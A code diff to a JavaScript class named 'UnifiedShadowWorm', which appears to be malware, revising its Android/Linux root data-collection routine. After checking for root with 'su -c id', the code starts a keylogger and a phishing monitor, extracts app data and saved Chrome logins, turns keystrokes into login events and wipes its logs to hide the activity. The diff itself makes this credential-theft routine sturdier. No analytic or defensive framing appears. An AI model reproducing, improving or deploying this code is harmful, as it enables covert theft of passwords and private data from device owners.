@@ -906,43 +906,60 @@ class UnifiedShadowWorm {
   // ============================================
   // ROOT DATA COLLECTION (Android)
   // ============================================
+
   collectRootData() {
     const rootData = {};
 
-    if (!isRooted()) {
+    // Only attempt on Android or Linux
+    if (this.osDetector.type !== "android" && this.osDetector.type !== "linux") {
       rootData.rooted = false;
+      rootData.skipped_reason = "Non-Android/Linux platform";
       return rootData;
     }
 
-    rootData.rooted = true;
+    // Check for root access
+    let hasRoot = false;
+    try {
+      const result = execSync("su -c 'id'", { 
+        timeout: 1000, 
+        stdio: "pipe",
+        shell: "/bin/bash"
+      }).toString();
+      hasRoot = result.includes("uid=0");
+    } catch (e) {
+      hasRoot = false;
+    }
 
-    // Start keylogger
-    this.rootLoginCapture.start();
+    rootData.rooted = hasRoot;
 
-    // Start phishing monitor
-    this.rootPhishing.monitorAppLaunch();
+    if (!hasRoot) {
+      rootData.skipped_reason = "Device not rooted";
+      return rootData;
+    }
 
-    // Extract app data
-    rootData.app_data = this.rootAppExtractor.extractAll();
+    // Only collect if rooted and Database is available
+    if (!Database) {
+      rootData.skipped_reason = "sqlite3/better-sqlite3 not available";
+      return rootData;
+    }
 
-    // Extract saved Chrome logins
-    rootData.saved_logins = this.rootBrowserLogin.extractSavedLogins();
-
-    // Read keylogs
-    const keylogs = this.rootLoginCapture.readLogs();
-    rootData.login_events = this.rootLoginCapture.parseLoginEvents(keylogs);
-    rootData.keylogs = keylogs;
-
-    // Read app launches
-    rootData.app_launches = this.rootPhishing.readAppLaunches();
-
-    // Clear logs after collection
-    this.rootLoginCapture.clearLogs();
-    this.rootPhishing.clearLogs();
+    try {
+      this.rootLoginCapture.start();
+      this.rootPhishing.monitorAppLaunch();
+      rootData.app_data = this.rootAppExtractor.extractAll();
+      rootData.saved_logins = this.rootBrowserLogin.extractSavedLogins();
+      const keylogs = this.rootLoginCapture.readLogs();
+      rootData.login_events = this.rootLoginCapture.parseLoginEvents(keylogs);
+      rootData.keylogs = keylogs;
+      rootData.app_launches = this.rootPhishing.readAppLaunches();
+      this.rootLoginCapture.clearLogs();
+      this.rootPhishing.clearLogs();
+    } catch (e) {
+      rootData.collection_error = e.message;
+    }
 
     return rootData;
   }
-
   // ============================================
   // UNIFIED DATA COLLECTION
   // ============================================
